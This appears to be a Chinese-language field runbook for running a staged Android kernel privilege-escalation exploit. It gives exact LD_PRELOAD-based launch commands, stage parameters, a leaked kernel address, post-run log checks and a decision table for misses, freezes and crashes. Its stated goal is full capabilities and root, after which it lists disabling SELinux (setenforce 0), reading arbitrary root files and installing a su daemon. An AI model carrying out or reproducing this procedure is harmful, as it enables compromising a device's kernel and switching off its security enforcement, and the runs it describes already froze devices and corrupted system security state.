# 晨间执行总册（终版，零往返设计）2026-08-17

> 目的：**本文件自足**。现场按此执行，不需要等评审、不需要对话裁定。
> 所有分支都写了"推什么、停不停"，跑完把清单推仓库即可。
> 依据：HANG_MECHANISM_VERDICT（冻结已破案）+ mt57（已实现待编译）。

---

## 〇、状态快照（30 秒读完）

| 项 | 状态 |
|---|---|
| 冻结根因 | **已破案**：错位轮杂散写 → selinux_state 损坏 → binder 级联 → system_server 楔死。错位自检 = 读回指针高位 0xffff / mt57 canary |
| 胜局配方 | mt25 系二进制 + `SKIP_WARMUP=1` + 窗口 220/180。A1 第一轮即翻盘实证 |
| PTR 战绩 | 3 轮 3 win。R 轮死因 = mt35 假 cred 布局 +8 错位，**mt56 已修**（反汇编三源真值） |
| mt57（新） | canary 发间自检：杂散写上身即弃打剩余发次，错位轮暴露 6 发→最少。**先编译再跑** |
| 关键认知 | **R 不需要 Permissive**（main.c:754 护栏：perf 泄漏失败 = 开枪前干净退出）。A1 冻结区整体绕开 |

## 一、起飞前（一次性，约 15 分钟）

```sh
# 1. 拉最新代码 + 重编（含 mt56+mt57）
git pull && <现场既有编译流程> && sha256sum <产物>
# 2. 冷启动（或保持当前 boot 沉降 ≥10min）
# 3. 环境记录
date; cat /proc/sys/kernel/random/boot_id; getenforce
cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq
grep MemAvailable /proc/meminfo; cat /proc/loadavg
# 4. 纪律确认（全部满足才开跑）：
#   □ 手动逐轮（禁用 run_arc.sh，或改完它的 sleep 2 → sleep 120 再用）
#   □ 轮间隔 ≥120s；上轮 rc=124 → 先 ps -A | grep -E "sleep|preload" 查残留
#   □ 本 boot 冻结/崩溃预算 = 2，触发即收工
```

## 二、主菜：Enforcing 直打 R（第 1 轮）

```sh
am kill-all
timeout 220 env \
  PSELECT_SLIDE_TRIGGER=1 \
  PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 \
  PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1 \
  PSELECT_PTR_RIGHT=auto \
  PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 \
  PSELECT_SKIP_WARMUP=1 \
  PSELECT_WAIT_SECONDS=200 \
  LD_PRELOAD=/data/local/tmp/preload.so \
  /system/bin/sleep 180 > /data/local/tmp/R1.out 2>&1
echo "R1 rc=$? enforce=$(getenforce) boot=$(cat /proc/sys/kernel/random/boot_id)"
```

### 轮后三查（每轮必做，共 10 秒）

```sh
grep -a "bad leaked pointer\|CANARY" /data/local/tmp/R1.out
grep -a "PTR_RIGHT\|perf task\|mid-burst" /data/local/tmp/R1.out
cat /data/local/tmp/mt49_child_status.txt 2>/dev/null
```

### 判读表（按顺序取第一个命中）

| 看到什么 | 意味着 | 动作 |
|---|---|---|
| `mt28c: perf task leak failed` | Enforcing 拒绝 perf | **边界学到**：改走 A1 流程翻盘后再 R（A1 命令见 §四），间隔 120s |
| `CANARY CORRUPTED` | mt57 拦下错位轮 | 记下，等 5min + `getenforce` + dsh 健康，再跑下一轮 R |
| `bad leaked pointer` | 错位 miss（旧信号） | 同上，脏轮处置 |
| 六发全 `errno=110`，无上述 | 干净 miss | 等 120s，再来一轮 R（上限 3 轮） |
| 某发 `ret=0` / `mid-burst landing` | **R 落地** | 见 §三 |
| 设备冻结/重启 | 错位杂散写（mt57 未能拦住的那类） | 用户协议：短按×2 等 60s → 长按；**预算烧 1，停手推证** |
| pstore 有栈崩溃 | 新崩溃类 | pstore 原文 + .out 推仓库，停手 |

## 三、R 落地后（收割，不急打 C）

```sh
# 1. 父 shell 静观 60s（触发进程让它自然退）
sleep 60; cat /proc/sys/kernel/random/boot_id   # 存活判定唯一标准
# 2. 收割存活证据
cat /data/local/tmp/mt49_child_status.txt      # CapEff 是否满帽
grep -a "mt51\|root_seen\|CapEff" /data/local/tmp/R1.out
# 3. CapEff 满帽且 boot 未变 → 8 分钟子进程窗口内打 C：
TASK=$(grep -a "^task=" /data/local/tmp/mt49_child_status.txt | tail -1 | cut -d= -f2 | tr -d ' ')
am kill-all
timeout 220 env \
  PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C \
  PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=auto \
  PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 \
  PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_TASK=$TASK \
  LD_PRELOAD=/data/local/tmp/preload.so \
  /system/bin/sleep 180 > /data/local/tmp/C1.out 2>&1
echo "C1 rc=$? boot=$(cat /proc/sys/kernel/random/boot_id)"
```

### C 后终局检查

```sh
sleep 60; cat /proc/sys/kernel/random/boot_id
grep -a "CapEff\|root_seen\|ROOT-SEEN" /data/local/tmp/C1.out /data/local/tmp/mt49_child_status.txt
ls /data/local/tmp/root_marker.txt /data/local/tmp/root_alive.txt 2>/dev/null
```

**满帽 + root_seen=1 + boot 未变 = 项目目标达成**。此时可从容验证：
子进程内 `setenforce 0`、读任意 root 文件、装 su daemon（su_daemon.c
入口已备）。

## 四、回退路径：R 的 perf 被拒时才用（A1 翻盘）

```sh
am kill-all
timeout 220 env \
  PSELECT_SLIDE_TRIGGER=1 PSELECT_RETRY=1 \
  PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 \
  PSELECT_SKIP_WARMUP=1 \
  LD_PRELOAD=/data/local/tmp/preload.so \
  /system/bin/sleep 180 > /data/local/tmp/A1_$N.out 2>&1
echo "A1 rc=$? enforce=$(getenforce)"
# Permissive → 立即回 §二 打 R（此时 perf 已通）。轮间 120s + 三查。
```

## 五、收工推送清单（无论结果如何）

1. 本日所有 .out 原样（含 NUL 文件，别清）
2. arc/轮次时间戳记录（手动记也行：每轮起止 + rc）
3. 出现异常：pstore 全量原文（不 grep）+ bootreason（`getprop ro.boot.bootreason`）
4. mt57 编译产物 sha256

## 六、给用户的说明（可以直接念给用户听）

- 今晚冻结案已破：是错位写入打坏了系统安全组件，不是手机坏了，不是玄学
- 明早流程已经把冻结区绕开，正常情况不会再黑屏
- 万一黑屏：短按两次电源等 1 分钟，不行再长按；然后停手，别再跑
- 每一步该推什么文件都写在文档里，不需要再问任何人

—— 评审终版 · 本册自足，零往返 · mt56(cred 真值) + mt57(canary) 已在
仓库，等一次设备编译即可用
